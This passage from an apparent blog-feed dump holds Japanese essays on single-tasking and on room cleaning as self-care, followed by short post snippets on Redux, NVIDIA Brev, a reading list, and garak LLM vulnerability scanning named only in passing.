劫になった。なぜならまた何も完了しない一日が始まると分かっていたからだ。停滞の構造停滞の構造は、こうだった。停滞を恐れる → 全部やろうとする → 選択できない → 集中できない → 全てが中途半端 → 何も完了しない → 自己肯定感が下がる → さらに停滞する。この悪循環に、私は何ヶ月も、何年も、捕まっていた。戦略のない戦い戦略の本質は、何をやらないかを選択することだ。戦略とは、ある状況に作用する要因を診断・分析し、どう取り組むかに関する論理的な主張でなければならない。戦略の本質は、何をやらないかを選択することだ。マルチタスクというのは、戦略のない戦いだ。良い戦略は、重要な1つの結果を出すための的を絞った方針を示し、リソースを投入し、行動を組織するものだ。一日一日にも戦略が必要だ。でも私は、戦略を持っていなかった。「今日はこれをやる」という方針がなかった。「これはやらない」という選択もなかった。だから、全部やろうとした。そして、全てが中途半端になった。ここに逆説がある。私は、停滞したくなかった。だから、全部やろうとした。「これを放っておいたら、停滞する」「あれをやらなかったら、遅れる」。停滞への恐怖が、全部やろうとさせていた。停滞への恐怖が、選択を妨げていた。でも、全部やろうとした結果、何も完了しなかった。何も完了しないということは、停滞しているということだ。停滞を恐れるあまりに、停滞していた。でも、変わった。選択することにしたのだ。1つだけ選び、他は後回しにして、今はこれだけに集中する。何かを選ぶということは他を選ばないということであり、何かを選ばないということはそれを放っておくということだ。「放っておいたら停滞するんじゃないか」という恐怖と戦いながら、それでも選んだ。朝デスクに座って今日やるべきことを紙に書き出すと十個以上あるが、一つだけ選ぶ。新しい機能のコードを書くことを選び、他を全て後回しにする。Slackやメールやチャットは後で。今はこれだけ。1つを選ぶということは、自分を信じるということだった。「この1つを、自分は完了させられる」と信じること。「1つでは足りない」という不安を手放し、「1つを確実にやり遂げる自分の力」を信じること。その信頼が、選択を可能にする。Slackを閉じ、メールを閉じ、チャットの通知を切り、SNSのタブを閉じてスマートフォンを別の部屋に置く。必要なものだけを開く。エディタとドキュメント、それだけ。この瞬間、軽くなる。「全部やらなきゃ」というプレッシャーが消え、「今はこれだけでいい」という許可が自分を解放する。集中するとコードが書けるようになり、思考がクリアになり、時間を忘れる。集中した時間は一日中あちこち飛び回るより遥かに多くの成果を生み、そして何より疲れていない。1つ完了させるときの感覚。「今日はこれができた」。この言葉が翌朝を支え、自分を好きになる。逆に何も完了しないと自分を嫌いになる。「今日もできなかった」と自分が情けなくなり、価値のない人間に思える。でも1つ完了させると違う。「自分にはできる」「明日もやれる」と思えて自分を認められる。選択することが前に進むことだった。全部やろうとすることが停滞することだった。小さく始める「今日から1つずつやる」と決意した。しかし初日、挫折した。午前中は良く1つのタスクに集中できたが、午後にSlackの通知が気になって開いてしまい、そのまま1時間あちこちのスレッドを読んでいた。「やっぱり自分には無理だ」と思った。完璧を求めすぎていた。一日中全てのタスクで完璧に1つずつやるというのは理想だが現実的ではない。だから小さく始めることにした。「朝の最初の2ポモドーロだけ、一つのタスクに集中する。それだけ」。これならできた。2ポモドーロ（50分）だけなら通知を切ることも怖くなく、1つのことに向き合える。そして不思議なことに、この2ポモドーロの習慣ができると他の時間も変わり始めた。「どうせ朝2ポモドーロ集中するなら、もう2ポモドーロもやってみよう」という気持ちになる。小さな変化が次の変化を呼ぶ。一週間後には朝の4ポモドーロは集中できるようになり、二週間後には午後も2ポモドーロ集中できるようになり、一ヶ月後には一日のうち8ポモドーロはしっかり集中できるようになっていた。完璧ではない。今でも午後は時々脱線するし、疲れている日は集中できない日もある。それでいい。完璧を目指して何もしないより、不完全でも小さく始める方がずっと前に進める。これは掃除の時と同じだった。掃除を始めた時も「毎日完璧に掃除をする」と決めて三日で挫折したが、「朝起きたらベッドを整える。それだけ」と小さく始めたら続いた。変化は小さく、ゆっくりと。計測するポモドーロ・テクニックを使っている。25分のタイマーをセットして1つのタスクだけに集中する。最初の衝撃は大きかった。「これは30分で終わる」と思っていたタスクが実際には3ポモドーロ（75分）かかり、「ちょっとだけ」と思って見たSlackが30分経っていた。自分の時間感覚はずれていた。人間は系統的に自分がどれだけ時間を使うかを過小評価する。心理学者はこれを「計画錯誤」と呼ぶ。でも計測を続けると変わり始めた。タイマーをセットすると制約があるから集中し、1日の終わりに振り返ると何に時間を使ったかが明確になる。数字は嘘をつかない。現実を直視しないと改善できない。計測は自分に嘘をつけなくする装置だった。完了させたタスクを記録し、ポモドーロを積み重ねて完了させる。夜、振り返る。「今日はこれができた」。この充実感が翌朝を支える。できなかったことが、できるようになる話プログラミング言語を初めて学んだ時のことを覚えているだろうか。最初は文法や構文が全く分からなかった。ifとforの違いすら理解できず、エラーメッセージの意味も分からず、ただ赤い文字が表示されるだけだった。しかしある瞬間書けるようになった。変数の宣言、条件分岐、ループ、関数。最初は1行も書けなかったが今は様々な表現を組み合わせて自分の意図をコードで表現できる。その瞬間まで「プログラムを書く」という行為は不可能だったが、その瞬間から可能になった。できないとできるの間に明確な境界線があった。成長は滑らかな曲線じゃない。階段だ。できない状態が続いて、続いて、続いて、そして突然できるようになる。プログラミングもそうだった。最初、再帰が全く理解できず、何度も同じ説明を読んで何度も同じコードを書いたがわからなかった。でもある日わかった。その瞬間まで「再帰」は呪文だったが、その瞬間から道具になった。この経験が教えてくれること。それは「今できない」は「今後もできない」じゃないということだ。小さな成功が、信じる力をくれる心理学者バンデューラは「自己効力感」という概念を提唱した。「自分にはできる」という信念。この信念はどこから来るのか。彼が挙げた4つの源泉の中で最も強力なのは実際に成功した経験だった。他人の成功を見たり励まされたりしてもそれだけでは弱い。自分の手で実際に達成すること。これが「できる」という確信を作る。だから小さなタスクの完了が重要だった。大きなタスクは完了するまで何週間もかかり、その間「できた」という経験がないため「自分にはできるんだ」という確信が育たない。でも小さなタスクなら毎日完了でき、毎日「できた」という経験を積める。「できた」が「できる」を育てる。1つ完了させると「次もできる」と思えるようになり、また1つ完了させると「やっぱりできる」と確信に変わり、さらにもう1つ完了させると「自分には力がある」と信じ始める。この積み重ねが大きなタスクに向かう勇気をくれる。シングルタスクは、自分を信じる力を取り戻す行為だった。全部やろうとしていた時、私は自分を信じていなかった。「1つだけでは不十分だ」と思っていた。でも1つずつ完了させることで、「自分には完了させる力がある」と信じられるようになった。その信頼が、次の1つを選ぶ勇気をくれる。自分を信じられるから、1つを選べる。1つを完了させるから、さらに自分を信じられる。この循環が、停滞を終わらせる。停滞期の意味でも、いつも右肩上がりじゃない。時々停滞し、何週間も同じレベルに留まっている感じがして成長している気がしない。成長が止まったように見える「踊り場」のような期間。最初、これが辛かった。「もう成長が止まった」「自分の限界に達した」と思った。でも違った。停滞期は次の飛躍の準備期間だった。表面上は変化がないが内部では微細な変化が積み重なっており、それらが臨界点に達した時、突然質的な変化が起きる。水が氷になる時と同じだ。温度が下がっていき、99度、98度、97度と何も変わらずずっと水のままだが、0度の瞬間氷になる。小さく分割することの意味はここでも現れた。停滞期でも小さなタスクは完了し続け、「前に進んでいる」という実感を保てる。「今日もこれができた」という事実が停滞期を乗り越えさせてくれる。千里の道も老子は言った。「千里の道も一歩から」。この言葉を昔は単なる励ましだと思っていて「遠くても一歩ずつ進めば着く」という意味だと考えていた。でも違った。もっと深い意味があった。千里の道は一歩の集積以外の何物でもない。「千里先」という抽象的な目標はそれ自体では実在しない。存在するのは今この瞬間の一歩だけで、そして次の瞬間の一歩があり、その連なりが結果として千里になる。未来は抽象で計画も抽象だ。でも行動は常に具体的で常に今だ。だから分割の本質は抽象的な目標を具体的な行動に翻訳することだった。「良いエンジニアになる」という目標は抽象的すぎて実行できないが、「今日この記事を読む」は具体的で実行できる。抽象から具体へ、未来から現在へ。この翻訳が行動を可能にする。プロセスとしての成長ずっと「成長」を到達すべき地点だと思っていて「ここまで行けば成長した」という明確なゴールがあると考えていた。でも違った。成長は地点じゃなくプロセスだ。西洋哲学に「プロセス哲学」というものがある。世界を静的な「存在」ではなく動的な「生成」のプロセスとして捉える考え方だ。この視点から見るとすべてが変わる。目標は達成すべき状態じゃない。向かっていくプロセスだ。「良いエンジニア」という状態は実は存在せず、存在するのは「良いエンジニアであり続けようとする営み」だけ。一度到達したら終わりではなく、常に変化し、常に学び、常に適応し続けることが「良いエンジニアである」ということだ。成長は到達すべき地点じゃない。継続する運動そのものだ。「成長した」という完了形は実は幻想だった。存在するのは「成長している」という現在進行形だけ。山の頂上に着いたら成長は終わるのか。違う。頂上に着いたらまた次の山が見えてその山に向かって歩き始める。それが成長だ。能力は所有するものじゃない。発揮し続ける動的平衡だ。「プログラミングができる」という能力。それは一度獲得したら永遠に持ち続けられる静的な所有物じゃない。使い続けないと鈍り、学び続けないと時代に取り残される。常に発揮し、常に磨き、常に更新し続ける必要がある。能力は動詞であり名詞ではない。分割という行為はまさに静的な目標を動的なプロセスに変換する操作だった。「優れたプログラマーになる」という静的な目標は動けず手をつけられない。でも「今日このコードを書く」に変換すると動き始め実行できる。そしてその1つの行動が次の行動を生み、次の行動がまた次の行動を生む。気づけば「優れたプログラマーであり続ける」というプロセスの中にいる。ゴールは到達する場所じゃない。歩き続けること自体がゴールだった。結果じゃなくプロセスを信じる。「今日これができた」という小さな前進、それ自体が価値だった。それが積み重なった先に何があるかはわからないが、歩き続ければ確実に前に進んでいる。「なる」んじゃない。「であり続ける」んだ。自由のパラドックス分割することは制約を増やすことで、「今日はこれだけやる」と決めることは他のことをやらないと決めることだ。選択肢を減らすこと、それは不自由に思える。でも逆だった。制約が自由を生む。「何をやってもいい」という無制限の自由はかえって身動きを取れなくする。選択肢が多すぎて選べず、どれを選んでも「他の方が良かったんじゃないか」という後悔が付きまとう。でも「今日はこれをやる」と決めるとその瞬間、自由になる。もう迷わなくてよく、他のことは気にしなくてよく、今この1つだけに集中していい。境界があるからこそその中で自由に動ける。これは詩の形式と似ている。俳句は五七五という厳格な制約があるがその制約の中で無限の表現が生まれ、制約がないとかえって何も書けない。分割で得られる自由は3つある。認知的自由では情報量が減るから深く考えられ、全部を同時に考える必要がないから1つのことを徹底的に考えられる。時間的自由では全体が見えるから本当に重要なことに時間を使え、「これは後回しでいい」と判断できる。心理的自由では不確実性が減るから不安から解放され、「これだけやればいい」という明確さが心を軽くする。そして、もう1つの自由がある。自分を信じる自由だ。全部をやろうとしている時、私は自分を信じていなかった。「1つだけでは足りない」という不安に支配されていた。でも1つを選び、その1つに集中すると決めた時、「この1つを、自分は完了させられる」と信じる自由を手に入れた。制約が、自分を信じる余裕を生んだ。誠実さとしての計測最後にもう1つ重要なことへ気づいた。分割すること、計測することは自分へ正直になることだった。「今日も頑張った」と思いたいが実際には大半の時間をSlackやSNSで無駄にしていた。計測はこの自己欺瞞を許さず、数字は嘘をつかない。最初これは辛く、現実を突きつけられて「自分は思っていたほど生産的じゃない」という事実を認めなきゃいけなかった。でもこの誠実さこそが改善の出発点だった。現実から目を背けていては何も変わらない。理想を語るのは簡単で「もっと頑張る」「もっと集中する」と言えるが、それは具体性を欠いた空虚な言葉だ。大きなビジョンを持つことは重要だが、そのビジョンを実行可能なステップに翻訳すること、この地道で困難な作業が理想と現実を架橋する。分割は誠実さの実践だった。続けられることが、才能を超える才能のある人をたくさん見てきた。理解が速く、センスがあり、飲み込みが早い人たちを。でもその多くは消えていった。なぜか。続けられなかったから。どんなに才能があっても続けられなければ意味がなく、どんなに理解が速くても完了させられなければ意味がない。結局長く続けた人が最も遠くまで行く。そして長く続けるために必要なのは派手なスキルでも高度な知識でもない。選択する勇気と一つに集中する習慣だ。毎日1つを選び、毎日1つを完了させる。それを一週間続け、一ヶ月続け、三ヶ月続け、一年続ける。気づけば驚くほど多くのことを成し遂げており、そして何より続いている。才能は一瞬の煌めきだが、習慣は永続する炎だ。おわりに何ヶ月も、何年も、私は停滞していた。その原因が皮肉なことに停滞への恐怖そのものだった。停滞したくなかったから全部やろうとしたが、全部やろうとした結果、何も完了しなかった。停滞を恐れるあまりに停滞していた。そして今、分かる。全部やろうとしていたのは、自分を信じていなかったからだった。「1つだけでは不十分だ」「1つだけでは成長できない」。そう思っていた。1つのことを完了させる自分の力を、信じられなかった。選択することは何かを捨てることだと思っていた。でも違った。選択することが前に進むことだった。全部やろうとすることが停滞することだった。そして、選択することは自分を信じることだった。1つだけ選ぶ。他は後で。今はこれだけ。その瞬間「全部やらなきゃ」というプレッシャーから解放される。そして不思議なことに1つずつやると結果的により多くのことが完了する。シングルタスクは、自分を信じる行為だ。「この1つを、自分は完了させられる」と信じて、他を手放す勇気。その信頼が、停滞を終わらせる。1つを完了させるたびに、「自分にはできる」という確信が育つ。その確信が、次の1つを選ぶ勇気をくれる。結局長く続けた人が最も遠くまで行く。そして長く続けるために必要なのは派手なスキルでも高度な知識でもない。選択する勇気と一つに集中する習慣だ。そして何より、自分を信じる力だ。「どうせ自分なんか」という声が聞こえたとき、「全部やらなきゃ」と焦ったとき、「今日もできなかった」と思ったとき。まず、1つだけ選べ。他は後で。今はこれだけ。その1つだけに向き合い、完了させる。それだけでいい。完璧を目指す必要はない。ただ1つを選んで、1つずつやり続けること。その小さな選択と小さな完了の積み重ねが、停滞を終わらせる。そして、自分を信じる力を取り戻す。おい、一つずつやれ。それは命令ではなく、自分自身への、静かな呼びかけだ。そして、自分を信じるための、最初の一歩だ。一点集中術――限られた時間で次々とやりたいことを実現できる作者:デボラ・ザックダイヤモンド社Amazon戦略の要諦 (日本経済新聞出版)作者:リチャード・Ｐ・ルメルト日経BPAmazon忙しいのに退化する人たち　やってはいけない働き方作者:デニス・ノルマーク,アナス・フォウ・イェンスンサンマーク出版Amazon","isoDate":"2025-11-05T03:07:47.000Z","dateMiliSeconds":1762312067000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"2025年11月版読む予定本紹介","link":"https://zenn.dev/akasan/articles/870a86bf7189f1","contentSnippet":"今年もついに11月に突入しましたので、今月読みたい本をまとめてみます。今月はバタバタしていて少なめです。 機械学習 解釈可能なAI 機械学習モデルの解釈手法を実践的に理解する機械学習モデルはホワイトボックスなものからブラックボックスなものまで様々なモデルがあります。例えばみなさんが普段利用しているような生成AIや画像認識モデルなどのディープラーニングモデルはブラックボックスモデルであり、モデルが生成した結果がなぜそのような結果になったかを説明することは重要なことですがその解析は大変な内容となります。そのような内容を広く取り扱っている書籍であり、解釈可能なAIを実装するための基礎...","isoDate":"2025-11-04T13:57:39.000Z","dateMiliSeconds":1762264659000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"garakを用いてGeminiの脆弱性スキャンをしてみた","link":"https://zenn.dev/akasan/articles/f7adda4b70a138","contentSnippet":"今回はgarakを用いてGeminiの脆弱性スキャンをしてみました。garakは様々なLLMに対する脆弱性スキャンのための機能を提供していますが、執筆時点ではまだGeminiの対応はできていないようでした。しかし、garakにはREST API形式でLLMと接続してスキャンをする機能があり、今回はそれを利用してGeminiのスキャンをしてみました。garakについては過去に紹介していますので、合わせて以下の記事もご覧ください。https://zenn.dev/akasan/articles/34756e48c4f870なお、今回の実装をするにあたり、garakの公式ドキュメントと合わ...","isoDate":"2025-11-03T08:31:26.000Z","dateMiliSeconds":1762158686000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Redux基礎: APIをfetchして非同期でデータを表示する処理","link":"https://zenn.dev/takehiro1111/articles/react_redux_async_thunk","contentSnippet":"1.記事を書いた背景初めてReduxを触っているのですが、独特で慣れが必要だなと感じたのでコンポーネントを整理するにあたり、形として残しておきたかったためです。Reduxに不慣れな方のご参考にもなれば幸いです。 2.書くこと各コンポーネントの説明APIをfetchしてデータ表示する処理のコード 3.Reduxとは？Reduxは、アプリケーション全体の状態を管理および更新するためのパターンとライブラリです。UIは「アクション」と呼ばれるイベントをトリガーして何が起こったかを伝え、それに応じて「リデューサー」と呼ばれる別の更新ロジックが状態を更新します。Redu...","isoDate":"2025-11-03T03:43:35.000Z","dateMiliSeconds":1762141415000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"おい、部屋を掃除しろ","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/03/020316","contentSnippet":"はじめにどれだけ技術を学んでも、どれだけ正しいプロセスを知っていても、燃え尽きてしまったら意味がない。才能ある若者たちが最初は誰よりも速く理解して、誰よりも多くのコードを書いていたのに、数ヶ月後には姿を見せなくなる。「疲れた」と言って離れていく。逆に、最初は遅くても数年経った今も黙々と学び続けている人たちがいる。彼らに共通しているのは、自分を大切に扱う習慣を持っていることだった。ちゃんと眠る。ちゃんと食べる。ちゃんと休む。そしてちゃんと掃除する。その中でも最も基本的な実践が、掃除だ。在宅勤務を始めて六年目のある朝、ふと自分の部屋を見回した。今、部屋は比較的綺麗だ。床に物は落ちていない。デスクの上も整理されている。技術書も本棚に並んでいる。窓を開けて空気を入れ替える習慣もついた。カーテンも開いていて、部屋の中は明るい。30歳のエンジニア、独身。在宅勤務という働き方は自由をくれたはずなのに、気づけば自分は4畳半の部屋の中で完結した生活を送っている。仕事もする。プログラミングもする。読書もする。ブログも書く。趣味もある。孤独は嫌いではない。むしろ好きだ。一人で考える時間、一人でコードを書く時間、一人で本を読む時間。誰にも邪魔されず、自分のペースで物事に向き合える時間。これは孤独であって、寂しさではない。寂しいと孤独は別物だ。孤独は選べるが、寂しさは選べない。でも私生活がぐちゃぐちゃになってしまうと、自分のプライベートも引きずられて悪くなる。掃除をしなくなる。自炊をしなくなる。身だしなみが雑になる。運動をしなくなる。風呂に入らなくなる。これらが崩れ始めると、部屋は散らかり、仕事も集中できなくなり、趣味も楽しめなくなり、選んだはずの孤独が、望まない寂しさに変わっていく。掃除は、精神の指標になる。部屋を見れば、今の自分の精神状態が分かる。乱れている時は心も乱れている。整っている時は心も整っている。結局、最も重要なのは燃え尽きずに続けることで、そのために必要なのは自分を大切に扱うことで、その最も基本的な実践が掃除なのではないか。この記事は、そんな仮説を自分自身で検証するために書いている。掃除とは何か。なぜ自分は掃除ができなくなるのか。そして掃除することで何が変わるのか。表面的な整理整頓の話ではなく、もっと根本的な、自分をどう扱うかという話だ。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。掃除できない理由は全て言い訳だ「忙しいから掃除できない」。でも本当にそうか？毎日Twitterを見て、YouTubeのショート動画を延々と見ている。気づけば一時間、二時間が過ぎている。つまり、時間がないのではない。掃除を優先していないだけだ。「疲れているから」という言い訳もある。でも実は、散らかった部屋で過ごしていることが疲れの原因かもしれない。視界の隅に常にゴミや散らかったものが入ってきて、それが無意識のストレスになっている。朝起きたときにすでに憂鬱で、仕事を始める前からエネルギーが削がれている。だから疲れる。そして疲れているから掃除しない。この悪循環。「どうせすぐ散らかるから」という諦めもある。以前掃除したけど三日後には元通りだった。でもなぜか。綺麗にした後、何も仕組みを変えていなかったからだ。服を脱いだら床に置く習慣、ゴミが出たらデスクに置く習慣、本を読んだら床に積む習慣。掃除をしたというより、一時的に物を移動させただけだった。これらの言い訳を並べてみて気づく。どれも本質的な理由ではない。本当の理由はもっと深いところにある。「どうせ自分なんか」という、言葉にならない諦めが。部屋を整えることが心を整えるよく「部屋の乱れは心の乱れ」と言われる。でもこの言葉は因果関係が逆だ。「部屋の乱れが心を乱す」のだ。そしてもっと正確に言えば「部屋を整えることが心を整える」。心という曖昧なものを直接コントロールすることは難しい。でも部屋という物理的な空間は、手を動かせば変えられる。服をハンガーにかける。ゴミを捨てる。床を拭く。これらは全て、具体的で、実行可能で、結果が目に見える行動だ。そしてこれらの行動が、不思議なことに心に作用する。綺麗な部屋で目覚めると、一日の始まりが違う。整理されたデスクで仕事をすると、思考がクリアになる。物が少ない空間にいると、頭の中も軽くなる。部屋を整えることは、心を整えるための、最も具体的で確実な方法なのだ。掃除は自分への態度を訓練する修行だ掃除は単に「清潔にする」ための行動だと思われがちだ。でも実は、もっと深い意味を持っている。自分をどう扱うかを、身体に教えている訓練なのだ。掃除とは、「自分の空間を整える力が自分にある」と確認することだ。散らかった部屋を見て「どうせ自分には無理だ」と諦めるのではなく、一つずつ片付けていく。床に落ちている服を拾う。ゴミを捨てる。デスクを拭く。この行為を通じて「自分には変える力がある」と身体で理解する。これは掃除だけではない。自炊なら「自分のために手を動かす価値がある」と身体が覚えること。身だしなみを整えるのは「私は丁寧に扱っていい存在だ」と身体に教えること。運動することは「自分の身体に投資する価値がある」と確認すること。風呂に入ることは「私は清潔でいていい存在だ」と身体に教えること。しかし、その中でも掃除は最も基本的で、最も効果が目に見えやすい実践だ。「どうせ自分なんか」と思って放っておく時間が続くと、それらの行為がどうしても億劫に感じて、身体は「私は放っておかれて当然なんだ」と学んでしまう。逆に言えば、少しずつでも、適当でも、掃除をしていくことで、「自分は守られていい」「手をかけられていい」と身体が再び信じ始める。これは精神論ではない。実際に起きることだ。部屋を掃除した日の夜、なぜか少しだけ自己肯定感が上がる。掃除は、自分への態度を訓練する修行なのだ。放置のサイクルと手入れのサイクル放置のサイクル朝起きる。部屋が汚い。気分が重い。でも掃除する気力がない。「今日は忙しいから」と自分に言い訳をする。朝食も作らない。シャワーも浴びない。適当な服を着る。仕事を始める。集中できない。視界の隅にゴミが見える。気が散る。効率が落ちる。疲れる。夜になる。もっと疲れている。掃除なんてできない。自炊もめんどくさい。風呂に入るのもめんどくさい。運動なんてもってのほか。「明日やろう」と思う。眠る。次の日も同じ。部屋は昨日より汚い。服がもう一枚増えている。ゴミがもう一つ増えている。気分はもっと重い。でも何もする気力はもっとない。そしてまた「明日やろう」と思う。一週間後、すべてが荒れ果てている。部屋は散らかり、床はほとんど見えない。デスクは物で埋まっている。空気は淀んでいる。そして自分の気持ちも荒れ果てている。「もうどこから手をつけていいか分からない」という諦めが支配している。毎日、放置という行動を通じて、「お前は放っておかれて当然だ」というメッセージを自分自身に送り続けている。手入れのサイクル朝起きる。部屋が綺麗。気持ちがいい。窓を開ける。空気を入れ替える。ベッドを整える。たった一分の作業だが、これだけで一日の始まりが違う。シャワーを浴びる。髪を整える。清潔な服を着る。朝食を作る。簡単なものでいい。温かいご飯。身体が目覚める。仕事を始める。デスクが綺麗だから集中できる。必要なものがすぐ見つかる。思考がクリア。コードがスムーズに書ける。効率が上がる。気持ちがいい。昼休み、食器をすぐ洗う。軽く散歩する。身体を動かす。夜、仕事を終える。運動する日もある。しない日も軽くストレッチする。夕食を作る。自分のために作った温かいご飯。シャワーを浴びる。床に落ちているものを片付ける。ゴミを捨てる。読んだ本を本棚に戻す。合計十分。でもこの十分が、明日の自分を助ける。身体は学習する。「私は手をかけられる存在だ」と。「私の空間は整っていていい」と。「私は価値がある」と。行動が、その人の存在の意味を決める。言葉ではなく、行動が。毎日の小さな選択が、自分をどう扱うかを決めている。規律という美学部屋が散らかっている時の自分は、不思議なことに、あらゆる面が乱れている。時間管理も散らかる。締切ギリギリになって慌てる。生活のあらゆる面は繋がっていて、一つの領域での乱れは、他の領域にも波及する。逆に、部屋を整えている時期の自分は、あらゆる面が整っている。朝、決まった時間に起きられる。約束を守れる。締切を守れる。自分との約束も守れる。そしてこの規律が、自分という存在に秩序をもたらす。美しさとは、日々の規律ある行動から生まれる副産物なのではないか。一つ一つの動作に美を宿すこと。服を畳むときに丁寧に畳む。食器を洗うときに丁寧に洗う。掃除をするときに隅々まで拭く。これらの「めんどくさい」行為が、実は自分を美しくしている。誰も見ていない。在宅勤務だから誰にも会わない。だから適当でいい。そう思って過ごしていると、その「適当さ」が身体に染み込んでいく。でも逆に、誰も見ていなくても、自分のために丁寧に生きる。その選択が、自分を美しくする。掃除は「修行」として捉えるべき実践なのだ。小さく始めるという勇気ある日、決意した。「今日から毎日掃除をする」と。でも夜には忘れていた。三日目には諦めていた。「やっぱり自分には無理だ」と。問題は、始め方が大きすぎたことだ。「毎日掃除をする」というのは、実は途方もなく大きな変化だ。でもある時、試しに小さく始めてみた。「朝起きたら、ベッドを整える。それだけ」。これなら一分もかからない。簡単すぎる。でもこれを続けた。一週間、二週間、一ヶ月。気づけば習慣になっていた。そして不思議なことに、ベッドを整える習慣ができると、他のことも少しずつやりたくなってきた。「どうせベッドを整えるなら、カーテンも開けよう」「どうせカーテンを開けるなら、窓も開けよう」「どうせ窓を開けるなら、ゴミも捨てよう」。小さな一歩が、次の一歩を呼ぶ。完璧を求めて何もしないより、不完全でも小さく始める方が、ずっと前に進める。一日五分の掃除と、週に一回の大掃除、どちらが効果的か。前者だ。なぜなら習慣になるから。小さく始めることは、実は最も大きな勇気を必要とする。なぜなら、小さすぎて効果がないように感じるから。「たったこれだけで意味があるのか」という疑念と戦わなければならない。でも意味はある。確実にある。身体は小さな変化を記憶する。そして小さな変化の積み重ねが、大きな変化になる。おわりにこの記事を書きながら、自分の部屋を見回している。今、部屋は比較的綺麗だ。床に物はほとんど落ちていない。デスクの上も整理されている。窓を開けて空気を入れ替える習慣もついた。これらの小さな習慣が、気持ちを支えている。仕事にも集中できる。コードを書くのも、ブログを書くのも、本を読むのも楽しい。掃除は、精神の指標になる。今、部屋が比較的綺麗なのは、今の精神状態が比較的安定しているということだ。でも油断すると、すぐに乱れる。だから毎日少しずつ手をかけ続ける。才能があっても燃え尽きたら意味がない。理解が速くても続かなければ意味がない。結局、長く続けた人が、最も遠くまで行く。そして長く続けるために必要なのは、派手なスキルでも高度な知識でもなく、自分を丁寧に扱う日々の習慣だ。掃除は単なる家事ではない。自分への態度を訓練する修行であり、自分という存在をどう扱うかを身体に教える実践だ。そして何より、燃え尽きないための、最も基本的な自己防衛の手段なのだ。在宅勤務で過ごす30歳の自分にとって、掃除は生き延びるための技術になった。孤独は好きだ。一人で考える時間、一人でコードを書く時間、一人で本を読む時間。誰にも邪魔されない自由。でもその孤独を愛するためには、まず自分の空間を整える必要があった。部屋を整えることで、心を整える。空間に秩序をもたらすことで、人生に秩序をもたらす。そして集中して仕事ができる。コードが書ける。ブログが書ける。本が読める。選んだ孤独を、寂しさに侵食されずに生きられる。自分を大切にするということ。それは掃除をすること、自炊をすること、身だしなみを整えること、運動をすること、風呂に入ること。これらすべてが大切だ。でもその第一歩が、掃除なのだ。「どうせ自分なんか」という声が聞こえたら、まず床に落ちている服を一枚拾う。ゴミを一つ捨てる。デスクを一度拭く。たったそれだけでいい。その小さな行動が、「自分は手をかけられていい」というメッセージを、自分自身に送る。そして身体がそれを覚える。少しずつ、少しずつ、「自分は大切にされていい存在だ」と信じ始める。完璧を目指す必要はない。毎日完璧に掃除する必要もない。ただ、少しずつでも、適当でも、自分に手をかけ続けること。それが掃除の本質であり、同時に自分を整えることの本質であり、そして燃え尽きずに続けるための、最も確実な方法なのだ。技術は大切だ。知識も大切だ。仕事も大切だ。プログラミングも大切だ。読書も大切だ。ブログも大切だ。趣味も大切だ。孤独を愛することも大切だ。でも最も大切なのは、自分を大切にすることだ。そしてその第一歩が、自分の部屋を掃除することなのかもしれない。おい、部屋を掃除しろ。それは命令ではなく、自分自身への、静かな呼びかけだ。長く続けるために。燃え尽きないために。そして、自分を大切にするために。利他・ケア・傷の倫理学作者:近内悠太晶文社Amazonカウンセリングとは何か　変化するということ (講談社現代新書)作者:東畑開人講談社Amazon","isoDate":"2025-11-02T17:03:16.000Z","dateMiliSeconds":1762102996000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"NVIDIA Brev上でGPUインスタンスを立ち上げる方法","link":"https://zenn.dev/akasan/articles/686e4b3ef0b8ff","contentSnippet":"今回はNVIDIA Brev（以下、Brev）を利用してGPUインスタンスを立ち上げる方法をご紹介します。ディープラーニングモデルの開発をはじめ、様々な用途でGPUインスタンスを利用したい場合があるかと思います。そのような場合に取りうる選択肢の一つとして、Brevを利用することができ、その利用方法を紹介できればと思います。 NVIDIA Brevとは？NVIDIA Brevは、一般的なクラウドプラットフォーム上のNVIDIA GPUインスタンスへの効率的なアクセスをはじめとして自動環境セットアップ、柔軟な展開オプションを提供し、開発者がすぐに実験を開始できるようにしてくれるサービス...","isoDate":"2025-11-02T07:52:43.000Z","dateMiliSeconds":1762069963000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"garakでLLMの脆弱性スキャンをしてみた","link":"https://zenn.dev/akasan/articles/34756e48c4f870","contentSnippet":"今回はNVIDIAがOSSとして提供しているgarakを用いて、LLMの脆弱性スキャンを試してみたので共有します。 garakとは？garakは生成AIに対するレッドチーミングおよびアセスメントのためのツールです。garakを利用すると、LLMが望ましくない方法で失敗させられるかどうかを検証し、ハルシネーションを初めジェイルブレイクなど多くの脆弱性を探知することができます。garakのドキュメントを確認すると、以下の特徴があるとのことです。LLMセキュリティへのフォーカス：主にLLMセキュリティに焦点を当ててており、他のツールが一般的な機械学習セキュリティやアプリセキュリティ...","isoDate":"2025-11-01T07:54:57.000Z","dateMiliSeconds":1761983697000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"言葉にしない限り、『なんか』は永遠に巨大な壁であり続ける","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/01/120027","contentSnippet":"はじめにワークショップが始まる三十分前、会場の隅で、一人の若者がノートPCの画面を凝視していた。ブラウザには二十を超えるタブが開かれている。Dockerの公式ドキュメント、Kubernetesの公式リファレンス、Qiita、Zenn、個人ブログ。静かな会場に響くのは、マウスホイールを回す音だけで、彼は次から次へとタブを切り替えながら、何かを探すように、あるいは何かから逃げるように、ドキュメントを読み続けていた。読んでいた、という言葉はきっと正確ではなくて、目で文字を追っているだけで、その言葉が本当に頭の中に入っているかどうかは、おそらく彼自身にも分からなかったのだろうし、分からないことに気づかないふりをしていたのかもしれないし、あるいは気づいていたけれど認めたくなかったのかもしれない。「準備しておかないと」ぽつりと呟いた声は、誰に向けられたものでもなかった。会場には他にも何人か早めに来ている参加者がいたけれど、彼らに向けた言葉でもなく、講師である僕に向けた言葉でもなく、けれど僕には分かった、あの言葉は自分自身への言い訳で、読み続けている限り「まだ始めていない」という事実から目を逸らせて、手元にあるyamlファイルを開くことも、Dockerfileを書き始めることもなく、ただスクロールを繰り返していれば、準備という名の猶予期間はどこまでも続いていくような気がして、その錯覚こそが